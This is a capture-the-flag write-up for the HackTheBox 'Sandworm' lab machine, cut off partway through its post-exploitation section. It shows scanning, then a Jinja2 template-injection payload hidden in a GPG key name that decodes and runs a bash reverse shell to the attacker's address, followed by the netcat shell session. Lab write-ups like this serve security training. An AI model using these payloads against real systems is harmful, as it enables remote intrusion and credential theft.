# HackTheBox Sandworm

A CTF lab machine of the HackTheBox platform's Medium level CTF platform running Linux, containing SSTI, sandbox environment and escape, Rust library compilation, privilege escalation via exploit.

## Service overview

Let's see what's running on the machine:

```bash
$ nmap -sV -sC -Pn -p1-65535 -vv -oN 10.10.11.218 10.10.11.218
PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp  open  http     syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http syn-ack nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA/organizationalUnitName=SSA/localityName=Classified/emailAddress=atlas@ssa.htb
| Issuer: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA/organizationalUnitName=SSA/localityName=Classified/emailAddress=atlas@ssa.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-04T18:03:25
| Not valid after:  2050-09-19T18:03:25
| MD5:   b8b7:487e:f3e2:14a4:999e:f842:0141:59a1
| SHA-1: 80d9:2367:8d7b:43b2:526d:5d61:00bd:66e9:48dd:c223
| -----BEGIN CERTIFICATE-----
| MIIDpTCCAo0CFBEpfzxeoSRi0SkjUE4hvTDcELATMA0GCSqGSIb3DQEBCwUAMIGN
| MQswCQYDVQQGEwJTQTETMBEGA1UECAwKQ2xhc3NpZmllZDETMBEGA1UEBwwKQ2xh
| c3NpZmllZDEaMBgGA1UECgwRU2VjcmV0IFNweSBBZ2VuY3kxDDAKBgNVBAsMA1NT
| QTEMMAoGA1UEAwwDU1NBMRwwGgYJKoZIhvcNAQkBFg1hdGxhc0Bzc2EuaHRiMCAX
| DTIzMDUwNDE4MDMyNVoYDzIwNTAwOTE5MTgwMzI1WjCBjTELMAkGA1UEBhMCU0Ex
| EzARBgNVBAgMCkNsYXNzaWZpZWQxEzARBgNVBAcMCkNsYXNzaWZpZWQxGjAYBgNV
| BAoMEVNlY3JldCBTcHkgQWdlbmN5MQwwCgYDVQQLDANTU0ExDDAKBgNVBAMMA1NT
| QTEcMBoGCSqGSIb3DQEJARYNYXRsYXNAc3NhLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAKLTqQshN1xki+1sSRa6Yk5hlNYWroPyrVhm+FuKMpNL
| cjW9pyNOV/wvSdCRuk/s3hjqkIf12fljPi4y5IhqfcpTk+dESPGTiXdrE7oxcWHn
| jQvE01MaT9MxtIwGiRBupuFvb2vIC2SxKkKR28k/Y83AoJIX72lbeHJ9GlNlafNp
| OABrIijyFzBou6JFbLZkL6vvKLZdSjGy7z7NKLH3EHTBq6iSocSdxWPXtsR0ifeh
| hODGT2L7oe3OWRvClYTM3dxjIGC64MnP5KumamJoClL2+bSyiQzFJXbvcpGROgTU
| 01I6Qxcr1E5Z0KH8IbgbREmPJajIIWbsuI3qLbsKSFMCAwEAATANBgkqhkiG9w0B
| AQsFAAOCAQEAdI3dDCNz77/xf7aGG26x06slMCPqq/J0Gbhvy+YH4Gz9nIp0FFb/
| E8abhRkUIUr1i9eIL0gAubQdQ6ccGTTuqpwE+DwUh58C5/Tjbj/fSa0MJ3562uyb
| c0CElo94S8wRKW0Mds0bUFqF8+n2shuynReFfBhXKTb8/Ho/2T2fflK94JaqCbzM
| owSKHx8aMbUdNp9Fuld5+Fc88u10ZzIrRl9J5RAeR5ScxQ4RNGTdBVYClk214Pzl
| IiyRHacJOxJAUX6EgcMZnLBLgJ1R4u7ZvU3I3BiaENCxvV6ITi61IwusjVCazRf3
| NNn7kmk7cfgQqPCvmwtVrItRHxWEWnkNuQ==
|_-----END CERTIFICATE-----
|_http-title: Secret Spy Agency | Secret Security Service
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Add our host to /etc/hosts:

```bash
10.10.11.218 ssa.htb
```

Let's see what's on the web server:

```bash
$ gobuster dir -u https://ssa.htb -w /usr/share/wordlists/dirb/common.txt -k -t 20
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://ssa.htb
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
/about                (Status: 200) [Size: 5584]
/admin                (Status: 302) [Size: 227] [--> /login?next=%2Fadmin]
/contact              (Status: 200) [Size: 3543]
/guide                (Status: 200) [Size: 9043]
/login                (Status: 200) [Size: 4392]
/logout               (Status: 302) [Size: 229] [--> /login?next=%2Flogout]
/pgp                  (Status: 200) [Size: 3187]
/process              (Status: 405) [Size: 153]
/view                 (Status: 302) [Size: 225] [--> /login?next=%2Fview]
Progress: 4535 / 4615 (98.27%)
===============================================================
```

We found **admin** page but no credentials. But we found **guide** page interesting. Note that the application runs on flask. The service allows manipulating PGP digital signatures. Here at the last there is a **Public Key** and **Signed Text** field. It takes gpg key value and signed text verified with that Key and it will Verify Signature.

## Exploit with GPG:

We found **Real name** field is vulnerable to SSTI (Server Side Template Injection). So for testing we put {{7*7}} payload in name field. If it is vulnerable then it will give output 49 as a name.

```bash
$ gpg --gen-key (Key Generate)
Real name : {{7*7}}
Email Address : <any_mail>
```
```gpg --list-keys``` for checking all generate Keys.

Then we have to make our Public Key with the following command for Encryption.

```bash
$ gpg --armor --export <your_mail> > public_key.asc
```

Then we have to make our signed key to Encrypt our Message that we will put in Input Field as Signed Text.

```bash
$ echo "Test" > message.txt
$ gpg --clear-sign --output signed_message.asc messsage.txt
```

After putting this 2 Content into the Proper Field we press on **Verify Signature** and we found "49" [unknown]. It is jinja2 Template Engine. So it worked and it is exploitable.

Determined from the templates that the Jinja2 templating engine is used in our case. Payload generation:

```bash
$ echo "bash -c 'bash -i >& /dev/tcp/10.10.16.34/4444 0<&1'" | base64
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zNC80NDQ0IDA8JjEnCg==
```

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zNC80NDQ0IDA8JjEnCg== | base64 -d | bash"').read() }}
```

```bash
$ gpg --gen-key
gpg (GnuPG) 2.2.27; Copyright (C) 2021 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zNC80NDQ0IDA8JjEnCg== | base64 -d | bash"').read() }}
Email address: test@test.com
You selected this USER-ID:
    "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zNC80NDQ0IDA8JjEnCg== | base64 -d | bash"').read() }} <test@test.com>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: key B7B79BFC4896BC06 marked as ultimately trusted
gpg: revocation certificate stored as '/root/.gnupg/openpgp-revocs.d/007C935894E9AECF259BABB6B7B79BFC4896BC06.rev'
public and secret key created and signed.

pub   rsa3072 2023-10-25 [SC] [expires: 2025-10-24]
      007C935894E9AECF259BABB6B7B79BFC4896BC06
uid                      {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zNC80NDQ0IDA8JjEnCg== | base64 -d | bash"').read() }} <test@test.com>
sub   rsa3072 2023-10-25 [E] [expires: 2025-10-24]

$ gpg --output public.gpg --armor --export test@test.com
File 'public.gpg' exists. Overwrite? (y/N) y

$ cat public.gpg
-----BEGIN PGP PUBLIC KEY BLOCK-----

mI0EZTkWuwEEALwZV4//kMft4y7kv1bJZH1ZEYJ57VECCaJ8rRInd/hzIrprNlBR
ckDV3JdqbiRfIjEdtdKOnBf6+lHFWR302O1sBKmFYo95sIND6WpChBr0K9havCJz
L1IioTLz54nPAZwraPAmWKrbe/f/X9NxVD+LGe8/ZTSNZUNYVK5bK+d5ABEBAAG0
xHt7IHNlbGYuX19pbml0X18uX19nbG9iYWxzX18uX19idWlsdGluc19fLl9faW1w
b3J0X18oJ29zJykucG9wZW4oJ2Jhc2ggLWMgImVjaG8gTDJKcGJpOWlZWE5vSUMx
c0lENGdMMlJsZGk5MFkzQXZNVEF1TVRBdU1UWXVNelF2TkRRME5DQXdQQ1l4SURJ
K0pqRUsgfCBiYXNlNjQgLWQgfCBiYXNoIicpLnJlYWQoKSB9fSA8dGVzdEB0ZXN0
LmNvbT6IzgQTAQoAOBYhBJf9yp7HcioDXbcvEmiy/z1KyaiaBQJlOSvBAhsDBQsJ
CAcCBhUKCQgLAgQWAgMBAh4BAheAAAoJEGiy/z1Kyaia63YD/j3YZdXYVxpNoBpc
hhcWPb4yoAPS0ukOmOkEm3oLAMO1aqgCIPVgyCeC45BYCqIegnrvKEjU/6HMUTMk
7ImmwYVDSCvx1twnsDAaeNtpLLWNyRXdO67yvxtZBOZe0H4/n7h6gxw68p2TNrFR
kK8ISqrpm4oZbILJe785wTYs3u+quI0EZTkWuwEEAJU8jU5n5dkz5Xd3/MODWbSi
mUF9EEC1RK5WLWTFFiV5YK3YxWzlXSlyVc83gaBX6kYn2YInj/LLTF0/GlWB2i1F
68hy1C06irYRW/oGwq1jGgJX8l9fS21N1wlSRFQkZDLD45+Es4uD0mHe0KfqOd5+
lFSCL+/eUfdPTZV6CK4dABEBAAGItgQYAQoAIBYhBJf9yp7HcioDXbcvEmiy/z1K
yaiaBQJlORa7AhsMAAoJEGiy/z1KyaiaF9sD/0F8oua44M5cdE9oPhulVp0+xjvW
N5FVqx3LxYJp5QZGW3d+F4PqVHJWPF6Cr3WFc0fnXzDo7Zc5lwRt17oqey4LSZZv
X4Q4kQatxkw8GU/E36+TKf7KppVae2lHDl+s3XdgfSjFtG4ZpXpuVXt23Gfaph6S
J8N/GLte7jNoqSt5mQGNBGU5Iz4BDAC+VS6F0+xuiifAWM42tReaHh4YY8juBPY4
7pS8d7l0ReNevcESgEV/yRRB3nsFVWwjObTa21zNF5GXdfr8DmxagBgCFN7BxlDG
NjIIE0VJDDg+xmyPv45kM+sW4DXDqHSWOnTmdXPMyxH8PZqMMYf9AoKka+uRlC3Z
OWA0P6pjoIr/NrCA4JOIuanOnnv66OUK7qIVQSs4Hep4UuKT/54UE5mgmJwFYCku
qMnR74niETlqvxRUkMvsCVU/pMVSbbwLu7+Utr+Kqa9QTFma18HeVEvtkbbxkal0
L4qPS7QoUTDHLnvqBQRs9bcJCkStN3Wnnhg/GwqBwkTTMql4aNIY+6XrbkcvlbzK
emwLOZxDjesCmz7NzQ+aBrC3iHhzQ/fA5zSMj1O9SjLb30BxdAwUYfle+JYfXty1
JqlsT5d04DvwoGyqy2RokYhsGDVzhFgQfwTB1MflEPmgZTPc+qhQKbt1ZPD0hM7f
pCORcOjLDQ42+H7IaMWnv3zq+qTg34UAEQEAAbTEe3sgc2VsZi5fX2luaXRfXy5f
X2dsb2JhbHNfXy5fX2J1aWx0aW5zX18uX19pbXBvcnRfXygnb3MnKS5wb3Blbign
YmFzaCAtYyAiZWNobyBMMkpwYmk5aVlYTm9JQzFzSUQ0Z0wyUmxkaTkwWTNBdk1U
QXVNVEF1TVRZdU16UXZORFEwTkNBd1BDWXhJREkrSmpFSyB8IGJhc2U2NCAtZCB8
IGJhc2giJykucmVhZCgpIH19IDx0ZXN0QHRlc3QuY29tPokB1AQTAQoAPhYhBD09
Q/wL/ycypt2Ks6GMVBmFjfoDBQJlOSM+AhsDBQkDwmcABQsJCAcCBhUKCQgLAgQW
AgMBAh4BAheAAAoJEKGMVBmFjfoDW9IMAIvd7MC/zziiYJmUeddwWpY/4nrbdVpS
o4iMIwlhhbY0ksc358Z+Gop0Xl/5ZERFKgyWf7q1ZjTld//Nm9PIUQqWDBOMo61e
X/63Izb1jtPRCZn6UPRt1VJDBsnaJUvQMEyLdJ0JSQDnLEbMetsaDzJ6U+ctC5gL
MAYmUwqrDW7QpGE7K+ImV0QzevqSEVDuaTJLX1L6DGrbHMvSlIL2Y62Qqr4gXTKO
g50KLt1Tx14YuyXsdtGHUoh2MbZoLAFX7VgHPDhuSpeRPBwezyLseSp8ok+y1JB0
xy9MP+VjtlYWvXIHn5cgqgfPvrecHPIQXBOw9ruu077IexFhTgw3Yq6yNGwPQ5ud
oz+ABf49TQ/xa/Dilvkgael04D5GYTtBRcYvwb/Fsfmgpj5rFNiM81bEGZKL6qjz
Mndy6hixAngiPvpcq2sDMUXpVtSjvxCnVK6969D40b55YgvF95jjwMx4k4aavIOe
CKheqbS/jK2Vbz2QDNxmUNJOnxDYcHK+E7kBjQRlOSM+AQwAqpsMTA1VkCJDkAWz
D1Tx4WQV8AHmSaGpCRrbbeNTKsBC45N0Ws1fwVkIkHIhgtbtRRBiKpP+mzhgrzBQ
qrunGzcgAFkTx3G4Osn2fgda7UUObbcfEXbksJQt6VhLj4iKDio2kN82xJPbEj2w
tZCizI+CD2YPAfkW7VUGXWv8f8oPYvWsOo8lDPYx0tAKX/MHTUlmiYbrIbXlhakl
7vXGqO3tmWLrbzi+A4HZfVFB9wjyGfCYK2Y6tD+3iq07g0+EihlNb5DvOqxU5YQ1
lQ3T0nDv6hj5C+2EK2C1Er3IN2S1Z0xvOZ3fRzfMKxJL41c2XYaKJps5mV+L7Pey
R/P+pD4D/uiEOmqeQFRa7Vq/SA3Ma9AIuedr02qgcA+01xwATdLtOBU00vlbUUQQ
pchWG6+EGw5hNHmDaT+t5l5dlz1lDYpFVkXd/tvaz8PXNZrBa3kgLgMRSl1hsZ5i
mwYQfnyHmt12u4Ka2selIeTuH7kYWuvttRnQapjb1Jfe3Nz7ABEBAAGJAbwEGAEK
ACYWIQQ9PUP8C/8nMqbdirOhjFQZhY36AwUCZTkjPgIbDAUJA8JnAAAKCRChjFQZ
hY36Aw0nC/9+rgdl7g9zORKdKelhiZHimN5Ig61E1jxiqPtRQIuLZzTgXFvRis1m
pXNkMQri1Upxs2dU8POcQYrNAot/WlRplw1SxYVNubKVELVvfZMYBplajWJ7FjEc
zwIbniClW/A++/ojbcHTX+uPue8g8vTUpaST/Da4v+4OlIur2kNTwELwxDSIyogn
bw/jeqI3zumOSRa6vILFR6q3m45NZVfakateOXJQrpnAg9dlOVuRttAlz/qL2BoI
OMXvuqPP/Ii3LdR2CTgs3QFmCOAAquKiczwgFfvzyRH+o8ZakWQKcW4ituiFx/Vi
gGsbe7XSfN+LDEsDYlvkvoOfghAg6J7BYh1BGV4b5UmgmrWTEz2eGC16wDFwn3BM
L6WkcYRQnOD9TDZ/GukocnJUyfAnaEBE3AfUzhqxVEpm/xYH/26RpcVeLvIRuPwL
JaA41BpYAJegP3gd6ExL4A6Kl387rFrq57CSdLiINq89mfjGXuIsYYW8LwiKc5MM
SOwl5U/4nVeZAY0EZTko7AEMAOIMdFwZN6G4JK2iU5Dm0g5wO5KUOWiZXdqyk3J1
4bDDg/3MaRsUXCgzQRmEasfM0rrLzOa5AZzcahA1RUZaSe64iWqQL/MURnSNi0vV
czXGqHdcNGNLRt2NPu3BvwsuoCwzS0iw7MvBY9qHVfQ3U+cINO5HJ537vVjuO97I
k8jyW271MHGeoekMEZNV0/YBaJnV12F8UAaHIG/xhJoo6mAz24iAIKzu0YYCwtfq
D3sqWquxyJ559Wjm7O4TTZagaUxM67u2Up9CsLs+u2pI3xCv6r1/JCUY6lbkDPvq
hJtXtOHE7TsNNUIKMbTHgJP0KcM6rpW/iIVaIdsDWtIKIVXLAqhj02ixxmXyxZaS
CiT0q2j4PUL6xvKnt8vdjq0PLSm1ULyYNPH16VtGKa+R45cz/vFXAlbLN4lgU6co
AkGkaPDrLV8E103hjCAgiRl2wj43FKI44ko2YYAyt5SWF83vmc5pLdfa0rLkf0jV
KzHNj9su6biyFwDZT6ndOFS1+QARAQABtMR7eyBzZWxmLl9faW5pdF9fLl9fZ2xv
YmFsc19fLl9fYnVpbHRpbnNfXy5fX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdiYXNo
IC1jICJlY2hvIEwySnBiaTlpWVhOb0lDMXNJRDRnTDJSbGRpOTBZM0F2TVRBdU1U
QXVNVFl1TXpRdk5EUTBOQ0F3UENZeElESStKakVLIHwgYmFzZTY0IC1kIHwgYmFz
aCInKS5yZWFkKCkgfX0gPHRlc3RAdGVzdC5jb20+iQHUBBMBCgA+FiEE9BRi3s5X
2nGnwJteqcMAGoMmnFsFAmU5KOwCGwMFCQPCZwAFCwkIBwIGFQoJCAsCBBYCAwEC
HgECF4AACgkQqcMAGoMmnFv6NwwAwYCZyVNpPXjFd7ryk1wefEDb++voioQ0HNAZ
yiFB31gu/xMEL3f8Rxa3cIXcRDXIv4Y+Aom7E3t2caekl8l7w0kBgwht9ff2MmuZ
6LII3C+c8ZkCI0DBbHAYZAPEJhvACEmspfZDgzzj019UL3m2xWT1vomuqT16jFDn
4JUfXRYgP85opSO4VDAqhqtzrhSyYbsOsdNP3TM5na/1/V2AMIvCN/kFJAc9fiYP
KhPSyCRu8upsZdOsgMPhphPfun56Aapm6exdHqfYrgWCwG0Ta8Wt3v3AJ3sRdYvv
ZS2ryp4GMQ8j81xPeLafjaIP9FV9BqByAOgfB1WdNae0tRB6D6Gsil+Yw/GZljIj
B6rvKna6uneXiljsfAsW1jBDrplxjeju/mJ5h8BFXoNnFo8enoue5POgT53wQJK1
Q40RgSGBsKXJTEwLC5EHOSJ7x9VEm0R/9ERRRSwOBT6assZBqVL/5Ha3eYtJm9qQ
pv7oH5PkDtZ1+ihVE6F6XcmHew6+uQGNBGU5KOwBDACyANjTEgKk3x4pdWJtQKK/
qfsnaxk4GmkCE1zEQ/g6wRUGqJqnXENB3KZ/WNeBXygBG/Ruu314X1Op8NjuWl5f
7YLSZVU9YD4O93K2kqReEdUquhQavXViIzE4ngtxQCqInHwtGVlhWSDLWGc2N/g1
fEbINS6hGGoGTyV68h0yqsouJMeXszp9c9EH8KX49jNscu6g55l0hrXZ4y+U2pMV
AYm+72o+t9dFiF7VNRuHBBmacYaBGKouuB3HkBRs07B3GToiu40zixW+r6Z6P9RU
wW6cU+BCUmaO5JvKZ4cb0tkFWI3W+U8Vv74Wb2BGHYF23ieHmGrVshlvonj4fy7k
J8EndFljRCQJ7VjVj13Bvi6MdHZ4N3r0j9H+mu+1s9KaG24o3YhHuRpqXYYQUczK
HpYZJOGYpQe/5iDueAbNTuLf6+I6i+xOP/VC/VquxJ9UPLTubHUQlWNDgJTDi4ek
Ybz9XvQLvU/kk0O9SonGSYzwH3LYt76kCb3GamJMeL0AEQEAAYkBvAQYAQoAJhYh
BPQUYt7OV9pxp8CbXqnDABqDJpxbBQJlOSjsAhsMBQkDwmcAAAoJEKnDABqDJpxb
gCIMAKJpbaJWvVmYBOfQBNCtqTSkEyAyn0Bw+rAs3U0OrnAdof6vmqtbe5CtfekL
mdkuBfHXgTCGjJH2ZGXIGgZczdPtBBXsTqMv8QX4RjBi/Kk1ZSZ9uQvIdKeeqLmr
QRoxqRbQ66Dyu6x9mc4WwTx1NxP1yHI/xyt1+tAbk9NYIc2j8xw/pboBKVHV0f50
aRub4RtW9yQwb0vkPornQlcDxsIkVj5q0bIQ9lQ6qTFVjob9o7e0qUvd7ZJLK8aK
PBGMmdC2DLP0ilnNowEymkEbRsLk6dC1K2kaO+diqDjRbJ2wOsKmbxUtoUCwQs31
nYI55c/DTW4VA8Arr8VqTmfi+WiibVlu4+3co1tO3FeYMA7Tkk/Px/u8yTDGVPaG
mFuU/Z1L7webt2y/G6R3F9CLBs1cJeNb36Gn/kwuwOVkOjo8edBslQ7gCSkVtcYG
sCgH9AYs2Ftev8hdfuWla1JpZNj5R+nSFtkBHyBzetwolqSBEXnA1Egvb5AAJk4m
6HeAW5kBjQRlOTD4AQwAsSw800S6tPPYhw6g0LqTVdQeSogTe6gMYN8bOCwgA3F2
sgRBRse5V0CRQhSfKa8UK+aNtwYUePuc6f5TRKiTHXhtH1gUFYexnwxidmxEHtY9
j7V+NrCB9nWA3ExnMW9QOXQJMj2dnbEz3GZfKuxzgA1QUgcrpBefuufjAh5OaFzI
HpatFmVm6E/HfBMHJNlI9gBA1CA+4JquMoeVa+FysYMu3igd8XQLjRQHHCtH0FvG
k1cNKq+FuXiR5g0PpTl6ZafzyPi4YwgyFrE4hRbSIhYT77kFximn6CJ0gF7WCkHQ
wVA/SkK9z1FDZmhBKkVlbYm2a32gsefOuIo8d4mOC7hXyBbuf3Y3mPebpa+gw6lh
InvnnAnqgPh9ZZfJH4F8UOdPSMR+Y4HeKWpFxxcMSZ8JnhrykXzMh2TqpIS63krC
GHGt0zJa0qarxzwThDuI9yzuv+4f7V7nAYql60e8aSbEzQPNrH3nmP7APadUXTC6
C9Rd9pHSps4ezmLtrT3/ABEBAAG0yHt7IHNlbGYuX19pbml0X18uX19nbG9iYWxz
X18uX19idWlsdGluc19fLl9faW1wb3J0X18oJ29zJykucG9wZW4oJ2Jhc2ggLWMg
ImVjaG8gWW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1D
NHhNQzR4Tmk0ek5DODBORFEwSURBOEpqRW5DZz09IHwgYmFzZTY0IC1kIHwgYmFz
aCInKS5yZWFkKCkgfX0gPHRlc3RAdGVzdC5jb20+iQHUBBMBCgA+FiEEAHyTWJTp
rs8lm6u2t7eb/EiWvAYFAmU5MPgCGwMFCQPCZwAFCwkIBwIGFQoJCAsCBBYCAwEC
HgECF4AACgkQt7eb/EiWvAZQOQv/WKvFBoQba8m2ULb2Ny6vS19e8w7KghPUfrxa
yR79ia41kj1cStH29ElZFsSHGcSldGluc7oqgTK4CXMd6bpiyx51r8HjdotgjwvC
pMDhEY9dGEmGDpGtcQBp4slPIsZuHgM/34PxHbRpIvQZwCWU/OcLjeP7Zkc/DxsN
UyDBaAx3FeMRqo3Mj5gkouCcAq8YP8wm7KhIFJ1AG46zvs0IkAXEZsGnQ8hZPnyt
Kbs7TjI6F8ZHGgGnBuBw+dPgrm4JSO8zdwCqrCjXroMXO+r2HB0Nz5TLiP5YsQMW
0wEXgRAbxnf1PIQxiHuZoDxDhOOANKJi6Mwg7n42AvspmS03Q81IW3aLayiv7TeZ
NUm6IjVR2gA83twj96+P3IpyrV8Qlmbj1opNfVpnp2lJTNw0LDkNA0Ym9sWgPDVD
RC+NN4xudzD/s2/0EY+XyK9G7n20KRH+S9vVjTwiewvoAL35bl/T1OqUN/Z7pdSe
7gfb4OOkFFGi1yzpzz2VYkPRvVv0uQGNBGU5MPgBDADDBmn5jMx8Q42whlgjlBAV
NEar8RWniDD14odpJH7d5b3UjQycvARc7s5Wj9fofhOnwSRvWoRMNfrgdFO0Ev5Y
vPddVt3XeQzqzvF+cK7+Vq490nwa3sAvg61l86VE53dq5PWW/NCzM/I+exvEyfu8
xvoGws4WhQT4SX/9Ww/Hyf1ITt9oLidrDJ5OBEWXYFTRR6N7s6XYLhkCy7C9hJWW
jyjJcGoIbcL8oOnwSthGXAtv6LorUVI6aXkd+lxrYYEhlDGmbawpDtGbz3ANfQ0u
zEU/RMPTpdEZHRl4FbxPM0eN3QW73DV8eLa1qcjfOgAfYKNJsq0kN2inIi1eAhoM
d3DntLiDAe/W8NQIXIyApADs6ygykc9pP/st3jZjSa6AARWvbAUolu7RmR9a0+oy
v6dcW/L/3oeedSkBCQIBcefqlDKW3gsH+4QJFY+Lcvgu4UQZPIrT1dA4KEi74pR9
PvusXY9WvFmbtXFoMP7ZAQvAk1SYo7x64qzb6+nah7EAEQEAAYkBvAQYAQoAJhYh
BAB8k1iU6a7PJZurtre3m/xIlrwGBQJlOTD4AhsMBQkDwmcAAAoJELe3m/xIlrwG
3FcL/0mIiRUxF8jHiLt1FeDtGhVrXayDrH0AYJczOdKS0E2QUREW48ry12p8N2cf
KtBU+o4Xs3+GkxwPdvpF1HlER5RNFEyKHv3Tz3z7veNqdX+Yu/UCq140eOLVLpkC
TqKDGUbq5qTcG2etk12VgMjXhW1KRJ8VYvnt/C4gfN6A8rlKvtbGuKnoyPyx6+cn
uXqi0uX6kopYMhteOpwNqI+b4kxTTpmojv4ksEa3FlVjmnfZ1YfTyyT4mzGipIQ/
aOdjB+u3DEU0gK76uCJQpUw9RrPAQVhS4WVKryrpMW/7rYRqxGQYXVJu7aksJ9BT
yPDhu3NiJwbH9NPkO9QYcN5j2dGISnor8ZVb6IdWH0o+MOaDzWu1jHb18BSpKy0+
PM0CClcK3vSEffNs7wULLQrlPTyeG8RVXrXgdPQMabhGm37Ii4EJptNfqRosTDRQ
RUg/SP1Roo/u2RIs6q1htDAy3PzNF7Chn35QdIdBNOvqqCQ/0naAPjYuaumKwwFD
Gps1mQ==
=R3OU
-----END PGP PUBLIC KEY BLOCK-----

$ echo test | gpg --clear-sign
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

test
-----BEGIN PGP SIGNATURE-----

iLMEAQEKAB0WIQSX/cqex3IqA123LxJosv89SsmomgUCZTkxxgAKCRBosv89Ssmo
miOWA/sH2JoF8wEu32kwumnT3DnPDpMkTPQR72KGhYGomjOd+/+ORluYaoH6qecu
OwO4W69jP9fdN3iJB7kSWEUHJdDxi1gz4peaieIHEmyXGNNk16VSEfN/78vWnQx/
BS94LVoGzEpez+CCiRYFV+3mc/quSDu1jQoYna6rPYjB79jQfA==
=hFfR
-----END PGP SIGNATURE-----

```

## Atlas → Silentobserver

And suddenly we get a reverse shell in our netcat listener as **atlas** user.
Here in home folder we found **.config** folder and go into that. We found another folder and we climb up 1 by 1. At last we found **config.json** where we found username and password of **silentobserver** user.

```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.34] from (UNKNOWN) [10.10.11.218] 41154
/etc/profile.d/01-locale-fix.sh: line 2: /usr/bin/locale-check: No such file or directory
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
ls
SSA
ls -la
total 16
drwxrwxr-x 3 nobody atlas   4096 May  4 14:58 .
drwxr-xr-x 3 nobody nogroup   60 Oct 25 15:12 ..
-rw-r--r-- 1 nobody atlas   6148 Jan 31  2023 .DS_Store
drwxrwxr-x 7 atlas  atlas   4096 Jun  7 15:18 SSA
ls -l
total 4
drwxrwxr-x 7 atlas atlas 4096 Jun  7 15:18 SSA
cd SSA
ls
app.py
__init__.py
models.py
__pycache__
src
static
submissions
templates
cd src
ls
assets
css
js
cd
pwd
/home/atlas
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
ls -la
total 44
drwxr-xr-x 8 atlas  atlas   4096 Jun  7 13:44 .
drwxr-xr-x 4 nobody nogroup 4096 May  4 15:19 ..
lrwxrwxrwx 1 nobody nogroup    9 Nov 22  2022 .bash_history -> /dev/null
-rw-r--r-- 1 atlas  atlas    220 Nov 22  2022 .bash_logout
-rw-r--r-- 1 atlas  atlas   3771 Nov 22  2022 .bashrc
drwxrwxr-x 2 atlas  atlas   4096 Jun  6 08:49 .cache
drwxrwxr-x 3 atlas  atlas   4096 Feb  7  2023 .cargo
drwxrwxr-x 4 atlas  atlas   4096 Jan 15  2023 .config
drwx------ 4 atlas  atlas   4096 Oct 25 15:18 .gnupg
drwxrwxr-x 6 atlas  atlas   4096 Feb  6  2023 .local
-rw-r--r-- 1 atlas  atlas    807 Nov 22  2022 .profile
drwx------ 2 atlas  atlas   4096 Feb  6  2023 .ssh
cat .config
cat: .config: Is a directory
cd .config
ls
firejail
httpie
ls -la
total 12
drwxrwxr-x 4 atlas  atlas   4096 Jan 15  2023 .
drwxr-xr-x 8 atlas  atlas   4096 Jun  7 13:44 ..
dr-------- 2 nobody nogroup   40 Oct 25 15:12 firejail
drwxrwxr-x 3 nobody atlas   4096 Jan 15  2023 httpie
cd firejail
/bin/bash: line 17: cd: firejail: Permission denied
ls -la
total 12
drwxrwxr-x 4 atlas  atlas   4096 Jan 15  2023 .
